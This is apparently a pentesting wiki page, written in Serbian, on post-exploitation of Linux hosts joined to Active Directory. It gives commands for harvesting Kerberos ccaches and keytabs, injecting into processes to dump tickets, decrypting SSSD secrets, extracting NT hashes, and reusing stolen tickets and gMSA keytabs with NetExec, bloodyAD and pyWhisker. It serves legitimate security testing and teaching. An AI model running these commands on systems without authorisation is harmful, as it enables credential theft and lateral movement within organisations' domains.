# Linux Active Directory

Linux mašina takođe može biti prisutna u Active Directory okruženju.

Linux mašina unutar AD-a može **lokalno čuvati Kerberos materijal**: korisničke ccaches, keytab fajlove mašina/servisa i tajne kojima upravlja SSSD. Ovi artefakti se obično mogu ponovo koristiti kao bilo koji drugi Kerberos kredencijal. Da biste pročitali većinu njih, morate biti korisnik koji je vlasnik tiketa ili **root** na mašini.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeracija

### Enumeracija AD-a iz Linux-a

Ako imate pristup AD-u iz Linux-a (ili bash-u u Windows-u), možete pokušati da koristite [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) za enumeraciju AD-a.

Takođe možete pogledati sledeću stranicu da biste saznali **druge načine za enumeraciju AD-a iz Linux-a**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA je open-source **alternativa** Microsoft Windows **Active Directory-u**, prvenstveno za **Unix** okruženja. Kombinuje kompletan **LDAP direktorijum** sa MIT **Kerberos** centrom za distribuciju ključeva radi upravljanja sličnog Active Directory-u. Koristeći Dogtag **Certificate System** za upravljanje CA i RA sertifikatima, podržava **višefaktorsku** autentifikaciju, uključujući smart kartice. SSSD je integrisan za Unix procese autentifikacije.<sup>[[14]](#references)[[15]](#references)</sup> Više informacija o tome možete pronaći na:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefakti hosta pridruženog domenu

Pre nego što počnete da radite sa tiketima, utvrdite **kako je host pridružen AD-u** i **gde se Kerberos materijal zaista čuva**. Na modernim Linux hostovima ovim se obično upravlja pomoću `realmd` + `adcli` + `sssd`, a ne samo pomoću običnih fajlova u `/tmp`.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Ovo vam brzo govori da li host veruje AD-u, da li SSSD kešira identitete ili tickets, kao i da li su **machine/service keytabs** ili **KCM secrets** dostupni za abuse.<sup>[[4]](#references)[[10]](#references)</sup>

## Playing with tickets

### Pass The Ticket

Na ovoj stranici pronaći ćete različita mesta na kojima možete **pronaći kerberos tickets unutar Linux hosta**; na sledećoj stranici možete naučiti kako da transformišete ove CCache formate tickets u Kirbi (format koji je potreban za upotrebu u Windowsu), kao i kako da izvedete PTT attack:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Ako želite **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, itd.), pogledajte posebnu stranicu:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE files su binarni formati za **čuvanje Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` je i dalje uobičajen, ali moderne Linux deployment instalacije takođe koriste `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ili `KCM:%{uid}`. Proverite environment variable **`KRB5CCNAME`** i podešavanje `default_ccache_name` pre nego što pretpostavite da se tickets nalaze u `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Ponovna upotreba CCACHE ticketa iz keyringa

**Kerberos ticketi sačuvani u memoriji procesa mogu biti izvučeni**, naročito kada je ptrace zaštita mašine onemogućena (`/proc/sys/kernel/yama/ptrace_scope`). Koristan alat za ovu svrhu nalazi se na adresi [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), a omogućava ekstrakciju ubacivanjem u sesije i dumpovanjem ticketa u `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Za konfigurisanje i korišćenje ovog alata prate se sledeći koraci:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ova procedura će pokušati da izvrši injection u različite sesije, pri čemu će uspeh označiti čuvanjem izdvojenih ticket-a u `/tmp`, uz konvenciju imenovanja `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Ponovna upotreba CCACHE ticket-a iz SSSD KCM-a

SSSD održava kopiju baze podataka na putanji `/var/lib/sss/secrets/secrets.ldb`. Odgovarajući ključ se čuva kao skrivena datoteka na putanji `/var/lib/sss/secrets/.secrets.mkey`. Podrazumevano, ključ je čitljiv samo ako imate **root** dozvole.<sup>[[4]](#references)</sup>

Pozivanje alata **`SSSDKCMExtractor`** sa parametrima --database i --key parsiraće bazu podataka i **dešifrovati tajne**.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Extractor ispisuje sirove Kerberos JSON payload-e; konvertujte ih u upotrebljiv ticket cache ili drugi format ticket-a pre pass-the-cache/pass-the-ticket operacija.<sup>[[4]](#references)</sup>

### Brza keytab trijaža
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Izdvajanje naloga iz /etc/krb5.keytab

Ključevi servisnih naloga, neophodni za servise koji rade sa root privilegijama, bezbedno su uskladišteni u datotekama **`/etc/krb5.keytab`**. Ovi ključevi, slični lozinkama za servise, zahtevaju strogu poverljivost.<sup>[[5]](#references)</sup>

Za pregled sadržaja keytab datoteke može se koristiti **`klist`**. Na Linuxu, `klist -k -K -e` ispisuje principele, brojeve verzija ključeva, tipove enkripcije i sirovi materijal ključa. Ako je tip ključa **23 / RC4-HMAC**, vrednost ključa je takođe **NT hash** tog principala.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Za Linux korisnike, **`KeyTabExtract`** nudi funkcionalnost za izdvajanje RC4 HMAC hash-a, koji se može iskoristiti za ponovnu upotrebu NTLM hash-a. Imajte na umu da ovo pomaže samo kada keytab i dalje sadrži materijal **etype 23 / RC4-HMAC**. U okruženjima sa **isključivo AES-om** možda nećete dobiti hash koji može ponovo da se koristi, ali i dalje možete direktno da se autentifikujete pomoću keytab-a preko Kerberos-a.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Na macOS-u, **`bifrost`** služi kao alat za analizu keytab datoteka.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Korišćenjem izdvojenih informacija o nalozima i hash vrednostima, veze sa serverima mogu se uspostaviti pomoću alata kao što je **`NetExec`**.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### Ponovna upotreba machine account-a iz `/etc/krb5.keytab`

Na sistemima pridruženim pomoću `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` obično sadrži **computer account** i jedan ili više **host/service principals**. Ako imate **root**, nemojte ga samo izlistati: koristite jedan od principala navedenih pomoću `klist -k` da zatražite TGT i radite kao sam Linux host.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Ovo je naročito korisno kada sam **objekat računara** ima delegirana prava u AD-u ili kada je hostu dozvoljeno da preuzme druge tajne, kao što je **gMSA**.<sup>[[13]](#references)</sup>

### Ponovna upotreba ukradenog Kerberos materijala pomoću AD alata namenjenih Linuxu

Kada imate važeći `ccache` ili upotrebljiv keytab, možete raditi sa AD-om **direktno iz Linuxa** bez prethodnog konvertovanja svega u Windows formate. Mnogi moderni alati izvorno prihvataju `KRB5CCNAME` / Kerberos autentikaciju.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Ovo je dobar most između **Linux post-exploitation** i **zloupotrebe AD objekata**. Za same puteve zloupotrebe na nivou objekata pogledajte:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefakti

Novije Linux implementacije mogu direktno da koriste **Managed Service Accounts** iz AD-a. U praksi to znači da nakon kompromitovanja Linux servera možete pronaći ne samo host keytab već i **service-specific keytabs** generisane na osnovu gMSA-a. Uobičajena mesta za proveru su `/etc/gmsad.conf`, konfiguracione datoteke specifične za deployment i dodatne `*.keytab` datoteke unutar `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Ovo vam daje ponovo upotrebljiv Kerberos identitet za SPN-ove povezane sa tim gMSA, **bez pristupanja bilo kojoj Windows krajnjoj tački**.<sup>[[13]](#references)</sup> Za zloupotrebu gMSA/dMSA na nivou domena nakon sticanja viših privilegija u AD-u, pogledajte:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Kako napasti Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Pristup AD-u pomoću managed service account-a – Direktna integracija RHEL sistema sa Active Directory-jem](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Varijable okruženja za Kerberos – MIT Kerberos dokumentacija](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos dokumentacija](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: RC4-HMAC Kerberos tipovi enkripcije koje koristi Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Korišćenje Kerberos-a | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Otkrivanje i pridruživanje domenima identiteta | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Vodič za korisnike bloodyAD-a](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [O dokumentaciji | FreeIPA dokumentacija](https://www.freeipa.org/About.html)
- [15] [Napomene o izdanju FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Dokumentacija Linux Kernel-a](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos dokumentacija](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
